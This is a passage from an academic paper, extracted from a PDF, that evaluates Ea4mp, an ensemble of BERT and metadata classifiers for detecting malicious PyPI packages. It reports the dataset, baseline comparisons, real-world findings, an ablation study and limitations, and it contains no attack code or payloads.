and 1 means the similarity is less\\nthan 10%.\\nVersion.The package version typically reflects the software\\u2019s up-\\ndate and maintenance status; frequent updates with no significant\\nchanges might indicate a malicious package, as attackers could use\\nfrequent updates to evade detection [40]. The metadata version\\nindicates the format version of the package\\u2019s metadata. Malicious\\npackages might use older or non-standard metadata formats to\\nhide their true intentions. By analyzing the package version and\\nmetadata version, abnormal update patterns and non-compliant\\nmetadata formats can be identified.\\nAuthorInformation. Maliciousattackersoftenusefakeoranony-\\nmous author information, such as randomly generated strings or\\nirrelevant names. These irregular author details can serve as clues\\nto identify malicious packages.\\nDespite PyPI\\u2019s signature mechanism, malicious authors can still\\ndeceive detection systems and upload malicious packages through\\nvarious means. The signature mechanism primarily verifies the\\nsource and integrity of a package but cannot determine the pack-\\nage\\u2019sintentorcontentsafety.Attackersmightfirstestablishagood\\nreputationovertimebyreleasingharmlesspackagesandthengrad-\\nually introduce malicious code. Furthermore, attackers can use\\nmultiple accounts to release malicious packages, evading detection.\\nThey might also employ social engineering tactics to gain trusted\\ndevelopers\\u2019 signature permissions, thereby publishing malicious\\npackages.\\nDescription. Description section in metadata provides a crucial\\ndescription of the software package\\u2019s functionality and features,\\naiding users in understanding its purpose and capabilities. The De-\\nscription section also plays a significant role in detecting malicious\\npackages. Malicious software often employs deceptive language in\\nthe Description, exaggerating its functionality or providing false\\ninformation to lure users into downloading. Additionally, attackers\\nmay intentionally obscure descriptions to conceal malicious behav-\\nior, making it appear legitimate. By carefully analyzing the content\\nof the Description section, potential malicious software features,\\nsuch as false promises, descriptions inconsistent with functionality,\\nor unclear descriptions, can be identified, thereby enhancing the\\naccuracy and effectiveness of malicious package detection.\\nTraining Machine Learning Model.Our choice of classifier is\\ndictated by the relatively low dimensionality of the metadata fea-\\nture vectors and the subsequent need for ensemble approaches.\\nAccordingtothediscretizationrulesinTable1,wetransformedthe\\nmetadatafeaturesintovectorsanddefinedthelastdimensionofthe\\nvector as the label, where 1 indicates that the sample is a malicious\\npackage and 0 indicates that the sample is a benign package. To\\ntrain the classifiers, we input the metadata feature vectors of all\\nsamplepackagesintothemodelandsavedthetrainedmodellocally\\nto facilitate subsequent ensemble approaches.\\n1164\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. 1+1>2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection ASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA\\n3.3 Model Ensemble\\nWe chose the AdaBoost algorithm, which can adaptively adjust\\nthe model weight distribution, to ensemble the fine-tuned BERT\\nmodel and the well-trained machine learning model. Initially, we\\nset the weights of the two models to\\ud835\\udc64BERT =\\ud835\\udc64ML = 1\\n2. Then, we\\niteratively adjusted the weights of each model. In each iteration,\\nwe calculated the error sum of each classifier:\\n\\ud835\\udf16BERT =\\n\\ud835\\udc41/summationdisplay.1\\n\\ud835\\udc56=1\\n\\ud835\\udc64\\ud835\\udc56 \\u00b7\\ud835\\udc3c (\\ud835\\udc66\\ud835\\udc56 \\u2260\\u210eBERT(\\ud835\\udc65\\ud835\\udc56 ))\\n\\ud835\\udf16ML =\\n\\ud835\\udc41/summationdisplay.1\\n\\ud835\\udc56=1\\n\\ud835\\udc64\\ud835\\udc56 \\u00b7\\ud835\\udc3c (\\ud835\\udc66\\ud835\\udc56 \\u2260\\u210eML(\\ud835\\udc65\\ud835\\udc56 ))\\nwhere\\ud835\\udc41 representsthetotalnumberofsamplesinthetrainingdata,\\n\\ud835\\udc64\\ud835\\udc56 represents the weight of the\\ud835\\udc56-th sample,\\ud835\\udc66\\ud835\\udc56 represents the true\\nlabel of the\\ud835\\udc56-th sample,\\u210e(\\ud835\\udc65\\ud835\\udc56 ) and represent the predictions of the\\nBERT model and the machine learning model for the\\ud835\\udc56-th sample,\\nand\\ud835\\udc3c (\\ud835\\udc66\\ud835\\udc56 \\u2260 \\u210e(\\ud835\\udc65\\ud835\\udc56 )) are indicator functions that take the value of 1\\nwhen the\\ud835\\udc56-th sample is misclassified, and 0 otherwise. Then, we\\nupdated the model weights according to the formula:\\n\\ud835\\udc64BERT = 1\\n2 ln\\n(1\\u2212\\ud835\\udf16BERT\\n\\ud835\\udf16BERT\\n)\\n\\ud835\\udc64ML = 1\\n2 ln\\n(1\\u2212\\ud835\\udf16ML\\n\\ud835\\udf16ML\\n)\\nWe set the total number of iterations to 50. After 50 iterations, we\\nobtained the final model combination:\\n\\ud835\\udc3b (\\ud835\\udc65) = sign(\\ud835\\udefcBERT\\u210eBERT(\\ud835\\udc65)+ \\ud835\\udefcML\\u210eML(\\ud835\\udc65))\\nwhere\\ud835\\udc3b (\\ud835\\udc65) represents the final ensemble model, which performs\\nthefinalclassificationbyweightedcombiningthepredictionsofthe\\nBERTmodelandthemachinelearningmodel,andthe signfunction\\nreturns the sign of the result, with +1 indicating the positive class\\nand -1 indicating the negative class.\\n4 EVALUATION\\nTo evaluate Ea4mp, we investigate the following three research\\nquestions:\\n\\u2022 RQ1: Is Ea4mp more effective compared to other detection\\napproaches?\\n\\u2022 RQ2: Can Ea4mp identify malicious packages that exist in\\nthe wild?\\n\\u2022 RQ3: Does Ea4mp perform better than individual models?\\n4.1 Experimental Design\\n4.1.1 Dataset. To better validate the performance of Ea4mp, we\\nconstructed a dataset consists two main parts.\\nMalicious Sample.Due to ethical and moral considerations, re-\\nsearchers tend to avoid publicly disclosing known malicious pack-\\nages, and PyPI officials also recommend against publishing them\\non open platforms. Consequently, the datasets used to train cur-\\nrent detection approaches are generally small, leading to issues\\nsuch as overfitting and so on. As shown in Table 2, We collected\\nand filtered publicly available datasets from Duan [17], Ohm [31],\\nSnyk [12], and Guo [21] (As of March 2, 2024). From these datasets,\\nTable 2: Statistics of the constructed dataset\\nDataset #Malicious #Benign\\nGuo et al. [21] 2,888 -\\nOur 516 10,000\\nTotal 3,404 10,000\\nwe collected 2888 malicious PyPI packages that can be used for\\ntraining and testing. Of course, no dataset is too large, and the\\nlarger the dataset is, the more likely it is to avoid overfitting the\\nmodel.Also,encompassingnewlyemergedmaliciouspackagesinto\\nthe malicious package set can help model more comprehensively\\nin identifying existing malicious behaviors. So following [21], they\\nfound that although the PyPI official repository had removed most\\nmalicious packages, many of these packages were still available on\\nothermirrorsources[11,42,16,10,13].Weexpandedthedatasetby\\nsearching various mirror sources and discovered an additional 516\\nmalicious packages that were not included in the existing dataset.\\nFinally, we obtained a dataset containing 3,404 malicious packages.\\nBenign Sample.Following [24], we randomly downloaded 10,000\\npackages from PyPI. These packages were hosted on PyPI for more\\nthan 90 days and had been downloaded over 1,000 times. We used\\nthese packages as the benign sample set.\\n4.1.2 Baselines. To evaluate the performance of Ea4mp against\\nexisting approaches, we selected three SOTA approaches as our\\nbaselines for comparison. These three approaches are VirusTo-\\ntal [14], OSSGadget [1], and Bandit4Mal [43]. VirusTotal [14]\\nprovides an online detection platform where packages can be up-\\nloaded directly for analysis. It automatically detects whether the\\nsoftware package contains suspicious files, IPs, URLs,etc. OSSGad-\\nget [1] can identify potential backdoors and malicious code within\\na package. Bandit4Mal [43] is an approach to finding common\\nsecurity issues in Python code. It processes each file, builds an\\nAbstract Syntax Tree (AST) from it, and runs appropriate plugins\\nagainst the AST nodes. Since a few recent works either lacked the\\nactionable implementation details [40, 50] or had some technical\\nissues1 [24], we did not compare our approach with their repro-\\nduced versions to avoid the biased results caused by inconsistent\\nimplementations.\\n4.1.3 Implementation. We implement EA4MP in Python using Py-\\nTorch [32]. Our experiments are performed on a Linux workstation\\nwith an AMD RYZEN 7735HS CPU, 32GB RAM, and an NVIDIA\\nV100 GPU with 32GB memory, running Ubuntu 22.04 with CUDA\\n12.1.ForPythonscripts,wefirstemployPyCG[39]toconstructCG\\nandsortitbyusingthedepth-firstalgorithmandFastTextmodel[2].\\nThen, we apply StatiCFG [9] to extract ordered code behavior se-\\nquences from sorted CG and fine-tune the pre-trained BERT model\\n(downloaded from HuggingFace [45]) with a learning rate of 1\\ud835\\udc52-5.\\nFor metadata, we use regular-expression to match keywords.\\n1We reached to the authors for help, and they acknowledged that they had received\\nsimilar feedback from other users. Unfortunately, the implementation of MPHunter\\n[24] was still not reproducible when we submitted the paper.\\n1165\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\nTable 3: Performance comparison with the state-of-the-art\\nbaselines\\nApproach Precision Recall F1-score\\nVirusTotal [14] 92.8 81.1 86.6\\nOSSGadget [1] 79.6 86.9 83.1\\nBandit4Mal [43] 84.7 97.8 90.9\\nEa4mp 99.2 96.0 97.6\\n4.1.4 Evaluation Metrics. We employ three widely-used binary\\nclassification metrics, includingPrecision,Recall, andF1-score, for\\nevaluation. Precision refers to the ratio of truly malicious samples\\namong the detected ones, while Recall measures the percentage of\\nmalicious packages that are retrieved out of all known malicious\\npackages. F1-score is the harmonic mean of Recall and Precision,\\nand calculated as: 2\\u00d7 \\ud835\\udc45\\ud835\\udc52\\ud835\\udc50\\ud835\\udc4e\\ud835\\udc59\\ud835\\udc59 \\u00d7\\ud835\\udc43\\ud835\\udc5f\\ud835\\udc52\\ud835\\udc50\\ud835\\udc56\\ud835\\udc60\\ud835\\udc56\\ud835\\udc5c\\ud835\\udc5b\\n\\ud835\\udc45\\ud835\\udc52\\ud835\\udc50\\ud835\\udc4e\\ud835\\udc59\\ud835\\udc59 +\\ud835\\udc43\\ud835\\udc5f\\ud835\\udc52\\ud835\\udc50\\ud835\\udc56\\ud835\\udc60\\ud835\\udc56\\ud835\\udc5c\\ud835\\udc5b . To ensure the stability of\\nthe results, we used ten-fold cross-validation and took the average\\nof the test results as the final outcome.\\n4.2 RQ1: Effectiveness\\nExperiment Setup.We divided the dataset into ten equal parts,\\nnine of which were used for model training and one for model\\ntesting. To ensure the fairness of the experimental results, we use\\nthe same training set and test set to train and test Ea4mp against\\nOSSGadget, Bandit4Mal. Since VirusTotal provides an online\\ndetectionplatform,weonlyusethetestsettoverifyitsperformance.\\nResults.Table3showstheperformanceof Ea4mpcomparedtothe\\nthreebaselineapproachesonthesamedataset.Comparingthedata\\nin the table, it is evident that Ea4mp improves precision by 6.9% to\\n24.6% over the other approaches, achieving the highest precision\\namong all. Regarding recall, Ea4mp improved by 18.4% to 10.5%\\ncomparedtoVirusTotalandOSSGadget.AlthoughEa4mp\\u2019srecall\\nis slightly lower than Bandit4Mal, our precision is much higher\\nthanBandit4Mal,whichmeansthatafterdetection,wedon\\u2019tneed\\na lot of manual review to verify that the package that been labeled\\nas suspicious is malicious.\\nAnalysis. Due to the inherent limitations of these approaches,\\ntheirperformanceisnotasgoodasEa4mpprimarilybecause: First,\\nrule-based and pattern-based detection approaches (such as Ban-\\ndit4mal, OSSGadget) often misclassify behaviors like network\\nconnections and file operations in normal packages as malicious.\\nThe primary reason for this misjudgment is that these approaches\\nstruggle to differentiate the differences between malicious and nor-\\nmalbehavior. Second,VirusTotalisineffectiveagainstdiverseand\\nconstantly evolving malicious code because maintaining consistent\\nfingerprints for malicious code is challenging. This inconsistency\\nmakes it difficult for signature databases to capture the latest mali-\\ncious packages. Furthermore, OSSGadget focuses on identifying\\nbackdoorsandotherobviousmaliciousbehaviors.Thisfocusmakes\\nit hard for them to detect more covert malicious activities, such as\\ninformationtheftandunauthorizedfiles.Additionally,asrule-based\\ndetection approaches, these approaches cannot deeply analyze the\\ncode\\u2019s execution path and its interactions with external resources,\\nlimiting their ability to detect malicious behavior.\\nAnswer to RQ1:Ea4mp outperforms the existing baselines in\\nmost aspects. Although it is slightly inferior to Bandit4mal in\\nterms of recall, the precision of Ea4mp is 17.1% higher than that\\nof Bandit4mal.\\n4.3 RQ2: Practicality\\nExperiment Setup.In order to validate whether Ea4mp can dis-\\ncover malicious packages that exist in the wild, we crawledall\\npackages uploaded to PyPI between March 28, 2024, and April\\n18, 2024, from the official website [34], and removed empty ones\\nwithout Python scripts. In total, we collected 46,573 packages for\\nreal-world validation. Two authors separately review the reported\\nmaliciouspackages.Allsuspiciouspackages(includingsamplesthat\\ndid not reach a consensus) would be forwarded to a security expert\\nfromaprominentITenterprisewithatleastfiveyearsofexperience\\nin software supply security to conduct a secondary review.\\nOverall Performance.In total, Ea4mp discovered 139 suspicious\\npackages. After manual review, 119 (85.6%) out of them were con-\\nfirmed as malicious. We reported these malicious packages to the\\nPyPI official. As of May 1, 2024, 82 of them have been removed.\\nFalse Positive.By analyzing the 20 packages that were misclassi-\\nfied as malicious, we found that these false positives can be cate-\\ngorized into two main types.First, package name squatting. Some\\ndevelopers of popular packages may proactively upload packages\\nwith names similar to their popular packages to prevent attackers\\nfromusingtyposquattingtotargetthem.Thesepackagesoftencon-\\ntain parts of the popular package\\u2019s code and are missing part of the\\nmetadata. Since Ea4mp considers both the metadata and the source\\ncode, it can lead to false positives. This type of false positive also\\nvalidatestheimportanceandeffectivenessofincludingmetadataas\\na key indicator of a package\\u2019s maliciousness.Second, some benign\\npackagesusethesameAPIsasmaliciouspackagesbutforlegitimate\\npurposes. For example, some benign packages also use the request\\npackage to upload or download corresponding payloads, but they\\ndonotstealusers\\u2019privateinformationorinstallmaliciouspayloads\\non the user\\u2019s host. These insights can help refine our model and\\nreduce false positives in future iterations.\\nWe used t-SNE [6] to visualize the feature vectors of code behav-\\nior sequences and metadata processed by the BERT model and the\\nmachine learning models for both malicious and benign packages,\\nas shown in Figure 7. This figure clearly shows a distinct separa-\\ntion between malicious and benign packages in the feature space,\\nfurther validating the effectiveness of Ea4mp.\\nAnswer to RQ2:Ea4mp has indeed newly uncovered 119 ma-\\nlicious packages and 82 of them have been removed by PyPI\\nofficials.\\n4.4 RQ3: Ablation Study\\nExperiment Setup.To verify that Ea4mp performs better than an\\nindividual classifier, we tested the ensemble model, the fine-tuned\\nBERT model, and the machine learning models using the same\\ndataset. In addition, to evaluate the effectiveness of different ma-\\nchinelearningalgorithmsinhandlingmetadatafeaturevectorsand\\nto find the optimal choice for ensembling, we used four different\\nmachine learning algorithms, including Naive Bayes(NB), Decision\\n1166\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. 1+1>2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection ASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA\\n(a) t-SNE visualization of metadata feature vector\\n(b) t-SNE visualization of code behavior sequences\\nFigure 7: Visualization of malicious and benign packages.\\nTable 4: Comparison of the performance between different\\nvariants\\nApproach Precision Recall F1-score\\nEnsemble-AdaBoost 99.2 96.0 97.6\\nEnsemble-equal 95.9 92.3 94.1\\nBERT-only 98.2 90.6 94.2\\nNaive Bayes 76.1 81.3 78.6\\nDecision Tree 67.1 45.3 54.1\\nRandom Forest 80.2 76.4 78.3\\nSupport Vector Machine 76.1 69.3 72.5\\nTree(DT), Random Forest(RF), and Support Vector Machine (SVM),\\nto train four classifiers and tested their performance. The experi-\\nmental results are shown in Table 4. To validate whether using the\\nAdaBoost algorithm to adjust model weights adaptively performs\\nPrecision Recall F1\\n60\\n65\\n70\\n75\\n80\\n85\\n90Performance(%)\\nEA4MP\\nw/o pkgSize\\nw/o pkgName\\nw/o metaVer\\nw/o pkgVer\\nw/o autName\\nw/o homePage\\nw/o autEmail\\nw/o summary\\nw/o description\\nFigure 8: Sensitive analysis of the impact of different meta-\\ndata features on our approach.\\nbetter than directly assigning weights to the models, we also set\\nthe weights of both models to 0.5 and performed the ensemble.\\nResults And AnalysisBy comparing the data in Table 4, it is\\nevident that the ensemble approach outperforms the individual\\nmodels across all metrics. Compared to the individual BERT and\\nmachine learning models, the ensemble model improved precision\\nby 1%-47.8% and recall by 5.9%-111.9%. Compared to the model\\nwherewedirectlymaketheirmodelweightsequal,themodelpreci-\\nsion and recall after the ensemble using the AdaBoost algorithm is\\nimprovedby3.4%and4.0%.Weevenfoundthattheprecisionofthe\\nensemble model with equal weights is even 2.3% lower than that of\\nthe single BERT model. This implies that the weight assignment of\\nthe model needs to be modified adaptively using the algorithm in\\nthe iterations for better performance.\\nIn terms of handling metadata feature vectors, from the experi-\\nmental results, it is evident that the performance of Naive Bayes\\nand Random Forest models is superior compared to other machine\\nlearning models. Considering that the overall dimension of the\\nextracted feature vectors is relatively low and that some features\\nmight inevitably be missing during the feature extraction process,\\nNaive Bayes can handle these missing features effectively. Addi-\\ntionally, the Naive Bayes model has a higher F1 score. Therefore,\\nwe chose to combine the Naive Bayes model with the BERT model\\nfor the ensemble.\\nTo explore whether all metadata features are beneficial for mali-\\nciouspackagedetection,weremovedonemetadatafeatureatatime\\nand respectively trained an NB model to examine their individual\\ncontributions. The experimental results are shown in Figure 8. We\\ncan observe that all metadata features are essential to achieve the\\nbest performance, andDescription (one of our newly discovered\\nmetadata features) really makes a great contribution, resulting in\\nan absolute increase of 6.2% in precision and 9.9% in recall. The\\nresultsindicatethateachmetadatainformationdoesplayaroleand\\nbrings a performance improvement in malicious package detection.\\n1167\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\nAnswertoRQ3: Ourensembleapproachindeedperformsbetter\\nthan the individual non-ensemble models. Using the Adaboost\\nalgorithm to ensemble the models, it is also true that adaptively\\nassigning weights to the models can assist in identifying mali-\\ncious packages better than presetting weights for the models.\\n5 DISCUSSION AND LIMITATIONS\\nUsage Scenario.Similar to existing static solutions [40, 50], our\\napproach primarily focuses on scanning Python scripts. Despite\\nits wide applicability in detecting malicious packages in the PyPI\\necosystem, we also notice that other executable files can also be\\nexploited as the carriers of malicious code. For example, DLL-\\nsideloading [28] exploits the placement of a malicious Dynamic\\nLink Library (DLL) in a directory where a legitimate application\\nis expected to load it, allowing the attacker to execute unautho-\\nrized code. Nonetheless, such attack is similar in nature to Trojan\\nviruses by downloading malicious DLLs to the target directory of\\nthe victim host via malicious scripts in the packages. Although\\nwe do not directly deal with these executables (e.g., DLLs), their\\nsuspicious downloading behaviors may also be included in ordered\\ncodebehaviorsequencesofPythonscriptsandthuscanbedetected\\nby our approach. We randomly analyzed 100 malicious packages of\\nour testing set, and found 53 Trojan viruses. As a result, 49 out of\\nwhich are successfully detected, demonstrating the effectiveness of\\nour approach in the face of this case. We leave such exploration for\\nour future work.\\nCodeObfuscation. Codeobfuscationisacommontechniqueused\\ntoevadeexistingdetectionapproaches.Currently,mostapproaches\\nprimarily analyze software packages based on their source code\\nfiles. Some attackers circumvent detection by packaging their code\\nintobinaryexecutablefiles.Forexample,asmentionedinsection1,\\nthe \\\"xz\\\" package employed this method. Detecting such packages\\nrequires software security professionals to have reverse engineer-\\ning skills and to continuously monitor the resource usage of the\\nsoftware package during execution.\\nFortunately, code obfuscation also requires some technical ex-\\npertise from the attackers. Currently, the majority of malicious\\nsoftware packages mainly obfuscate the parameter values of func-\\ntions. This means that Ea4mp can still accurately capture the code\\nbehavior sequences and detect them. Overall, Ea4mp meets the de-\\ntectionneedsofmostexistingsoftwarepackages.However,whether\\nwe can utilize machine learning, deep learning, or large language\\nmodels to deobfuscate more complex forms of code obfuscation\\nremains a challenge that we need to address.\\nPythonVersion. TheevolutionofPythonitselfcanalsoimpactthe\\nretrieval of code behavior sequences. This is particularly true for\\nthe significant changes that occurred between Python 2.0 and 3.0\\nversions. The CG and CFG generation tools we selected only sup-\\nport packages written in Python 3.0 and above. During our actual\\ntraining process, we found that 42 malicious packages (accounting\\nfor 1.2% of the total malicious packages) used Python versions be-\\nlow 3.0. In contrast, none of the selected benign sample packages\\nwere found to use versions below Python 3.0.\\nOf course, we can choose other tools to generate code behavior\\nsequences for these packages. This doesn\\u2019t require a high level of\\ntechnicalexpertise,andwecaneasilyreplacethetools.Additionally,\\ntheuploadtimesoftheseolderversionmaliciouspackagesindicate\\nthat they were uploaded quite early. Newly discovered malicious\\npackages are still developed based on Python 3.0 and above.\\nLarge Language Models.Ea4mp has demonstrated with real data\\nthat large language models, such as BERT, exhibit excellent per-\\nformance in analyzing malicious behavior in code. This indicates\\nthat the application of large language models can significantly mit-\\nigate security threats in the open-source software supply chain.\\nHowever, as described in section 4.4, Ea4mp focuses solely on the\\nrelationships between various API and function calls, ignoring the\\nparameters passed within these functions. This resulted in nine\\nbenign packages being falsely labelled as malicious because they\\ninvoked APIs similar to those used by malicious packages. There-\\nfore, utilizing large language models to analyze functions and their\\nparametersinthesourcecodecouldbeafeasibleresearchapproach\\nto reduce false positives.\\nItisimportanttonotethattrainingorfine-tuninglargelanguage\\nmodels requires significant time and computational resources. For\\nexample,inEa4mp,fine-tuningapre-trainedBERT-basemodeltook\\nnearly 3 hours on an NVIDIA Tesla V100 32GB GPU. Compared to\\nexisting work that only trains a machine learning or deep learning\\nmodel [52, 18, 24, 40], Pre-training or fine-tuning a large language\\nmodeltakesseveraltimesaslong.Fortunately,weonlyneedtopre-\\ntrain or fine-tune the large language model for once. Subsequent\\ncalls to the model take relatively little time.\\n6 RELATED WORK\\nOurworkhasconnectionswiththreedifferentresearchareas,which\\nwe survey briefly: malicious package detection, package registry\\nsecurity, and empirical study of package security.\\nMalicious Package Detection.Detecting various malicious soft-\\nware packages within open-source software registries poses a sig-\\nnificantchallenge.Duanetal.[17]andGuetal.[20]bothemployed\\na multi-dimensional analysis framework to address this challenge.\\nTheyanalyzeregistrysecuritybasedonfundamentalregistryinfor-\\nmation, function calls at the source code level, package execution,\\nand system calls during dynamic analysis. Through continuous\\nmonitoring of mainstream open-source libraries, they have uncov-\\nered many suspicious packages. Liang et al. [23] introduced PPD, a\\nthird-party malware library identification framework employing\\nanomaly detection. This framework imports required packages to\\nform a comprehensive code package, utilizes AST and RegExp to\\nextract code features (e.g., IP addresses, dangerous functions), and\\nincorporates Levenshtein distance of package names into the fea-\\nture set. Anomaly detection algorithms are then employed to iden-\\ntify malicious packages. During the development of open-source\\npackages, developers often host code on GitHub. Inconsistencies\\nbetween the code released on PyPI and its corresponding GitHub\\nrepositorymayindicatemaliciousinjection.Toaddressthisconcern,\\nVu et al. [44] proposed LastPyMile, a framework for identifying\\ndisparities between software package construction artefacts and\\ncorresponding source code repositories. LastPyMile facilitates the\\nmonitoringofregistrysecurity,suchasPyPI,tomitigatesuchrisks.\\nZhang et al. [50] proposed Cerebro, an approach for extracting\\ncode behavior sequences based on abstract syntax trees. By extract-\\ning available APIs in the abstract syntax tree, a code sequence that\\n1168\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. 1+1>2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection ASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA\\ncandescribethemaliciousbehaviorsofattackersisformed,andthe\\nsequenceisusedasinputforfine-tuningtheBERTmodel.Although\\nZhang\\u2019s approach considers that code behavior sequence can as-\\nsist the model in understanding the attacker\\u2019s attack mode, the\\nextraction of behavior sequence still does not break away from the\\nlimitation of manual feature recognition. Liang et al. [24] proposed\\nan approach called MPHunter to identify malicious packages by\\nextracting code behavior sequences, converting the sequences into\\nvectors, and using clustering to find outliers. However, Liang\\u2019s\\napproach can only detect the setup.py script in the package, and\\naccordingtoGuoetal.[21],itisnotdifficulttofindthatattackersof-\\nten implant malicious code in multiple scripts to confuse detection\\napproaches.\\nIn contrast, our approach analyzes all Python script files and\\nautomatically extracts deep features from ordered code behavior\\nsequences of malicious packages via the BERT model without hu-\\nman intervention. In addition, we realize the value of metadata\\ninformation and construct an ensemble classifier to combine the\\nstrengths of code behavior features and metadata features for more\\neffective detection.\\nPackage Registry Security.There are many repositories that are\\noftenexploitedasplatformsfordistributingmaliciouscodeandsoft-\\nware libraries. Anomalicious leverages commit logs and repository\\nmetadata to identify anomalies and potentially malicious commits\\nautomatically.AttackersfrequentlyutilizeGitHub\\u2019sforkfunctionas\\nameanstostoreanddistributemalware[19].Tocounterthisthreat,\\nZhangetal.[51]employedanenhanceddeepneuralnetwork(DNN)\\nto analyze the code content of GitHub repositories. They utilized a\\nheterogeneous information network (HIN) to model neighborhood\\nrelationships, thereby enhancing recognition accuracy. Malicious\\nactorsoftenembedharmfulshellcommandsintoPythonscriptsfor\\nillicitpurposes.Conventionalstaticanalysisapproachesstruggleto\\ndetectsuchattacks.Zhouetal.[52]introducedPyComm,amachine\\nlearning-based model for detecting malicious commands in Python\\nscripts. PyComm considers multidimensional features, simultane-\\nously evaluating 12 statistical features of Python source code and\\nstring sequences. Fang et al. [18] utilized machine learning tech-\\nniquestoidentifyPythonbackdoors.Theyrepresentedtextthrough\\nstatistical features arising from confusion and the characteristics\\nof opcode sequences during compilation. Suspicious modules and\\nfunctions within the code were then matched, effectively detecting\\nembedded backdoors.\\nEmpiricalStudyofPackageSecurity. Tohelpresearchersgaina\\nmore comprehensive and in-depth understanding of package secu-\\nrity,existingworkhastheoreticallyexaminedattackers\\u2019approaches\\nand the composition of malicious code. Neupane et al. [27] con-\\nducted an in-depth analysis of typosquatting attacks. They moved\\nbeyondthetraditionaluseof1-stepDLdistancetoidentifypackage\\nconfusion attacks and instead categorized these attacks into 13 dis-\\ntinct types. They proposed a heuristics approach for automatically\\nidentifying package confusion based on these categories. Guo et\\nal. [21] constructed a dataset of malicious code and classified the\\ncollected malicious code based on its behavioral characteristics.\\nThey analyzed the propagation pathways of malicious packages\\nandtheirdistributionacrossdifferentmirrorrepositories.Addition-\\nally, they mapped the lifecycle of malicious code within the PyPI\\necosystem, highlighting the characteristics of malicious packages\\nat various stages. To enhance the security of the PyPI ecosystem,\\nthey proposed several mitigation measures.\\n7 CONCLUSION AND FUTURE WORK\\nIn this paper, we propose Ea4mp, an ensemble approach that com-\\nbines a fine-tuned BERT model and a well-trained ML model to\\ndetect malicious PyPI packages. We comprehensively consider the\\ncode behavior sequence and metadata information for malicious\\npackage detection. The BERT model is fine-tuned with code behav-\\nior sequences that were extracted from source code, and feature\\nvectors extracted from metadata are used to train the machine\\nlearning model. We use the AdaBoost algorithm to ensemble these\\ntwo models so that they can accurately detect malicious packages.\\nWe evaluate Ea4mp against the state-of-the-art approaches on a\\nnewly-constructeddataset.Ea4mpperformsbetteronmostmetrics.\\nWe also applied Ea4mp to real-world detection and found a total of\\n119 malicious packages by detecting 46573 newly uploaded PyPI\\npackages, the vast majority of which have been removed by PyPI\\nofficials. This indicates that Ea4mp is a practical approach that can\\nbeadoptedbythePythoncommunitytodetectemergingmalicious\\npackages.\\nIn the future, we plan to extend this approach to other open-\\nsource libraries, such as npm and Maven, to further enhance the\\nsecurity of software ecosystems across different programming lan-\\nguages.\\nACKNOWLEDGMENTS\\nThis research is supported by the National Natural Science Foun-\\ndation of China (No. 62202414 and 62402342), the Six Talent Peaks\\nProject in Jiangsu Province (No. RJFW-053); the Jiangsu \\u201c333\\u201d\\nProject and Yangzhou University Top-level Talents Support Pro-\\ngram (2022), the Open Funds of State Key Laboratory for Novel\\nSoftwareTechnologyofNanjingUniversity(No.KFKT2022B17),the\\nOpen Foundation of Yunnan Key Laboratory of Software Engineer-\\ning (No. 2023SE201), Postgraduate Research & Practice Innovation\\nProgram of Jiangsu Province (KYCX24_3747), and the China Schol-\\narship Council Foundation (No. 202308320436).\\nREFERENCES\\n[1] Bertus.2020.Ossgadget:collectionoftoolsforanalyzingopensourcepackages.\\nhttps://github.com/microsoft/OSSGadget.\\n[2] Piotr Bojanowski, Edouard Grave, Armand Joulin, and Tom\\u00e1s Mikolov. 2017.\\nEnriching word vectors with subword information.Trans. Assoc. Comput. Lin-\\nguistics, 5, 135\\u2013146. doi: 10.1162/TACL\\\\_A\\\\_00051.\\n[3] Jie Cai, Bin Li, Jiale Zhang, and Xiaobing Sun. 2024. Ponzi scheme detection in\\nsmart contract via transaction semantic representation learning.IEEE Trans.\\nReliab., 73, 2, 1117\\u20131131.\\n[4] Sicong Cao, Xiaobing Sun, Lili Bo, Ying Wei, and Bin Li. 2021.BGNN4VD:\\nconstructing bidirectional graph neural-network for vulnerability detection.\\nInf. Softw. Technol., 136, 106576.\\n[5] Sicong Cao, Xiaobing Sun, Lili Bo, Rongxin Wu, Bin Li, and Chuanqi Tao. 2022.\\nMVD: memory-related vulnerability detection based on flow-sensitive graph\\nneural networks. InProceedings of the 44th IEEE/ACM International Conference\\non Software Engineering (ICSE). ACM, 1456\\u20131468.\\n[6] Sicong Cao, Xiaobing Sun, Xiaoxue Wu, David Lo, Lili Bo, Bin Li, and Wei Liu.\\n2024. Coca: improving and explaining graph neural network-based vulner-\\nability detection systems. InProceedings of the 46th IEEE/ACM International\\nConference on Software Engineering (ICSE). ACM, 155:1\\u2013155:13.\\n[7] Sicong Cao et al. 2023. Improving java deserialization gadget chain mining\\nvia overriding-guided object generation. InProceedings of the 45th IEEE/ACM\\nInternational Conference on Software Engineering (ICSE). IEEE, 397\\u2013409.\\n1169\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\n[8] SicongCaoetal.2023.Oddfuzz:discoveringjavadeserializationvulnerabilities\\nvia structure-aware directed greybox fuzzing. InProceedings of the 44th IEEE\\nSymposium on Security and Privacy (SP). IEEE, 2726\\u20132743.\\n[9] 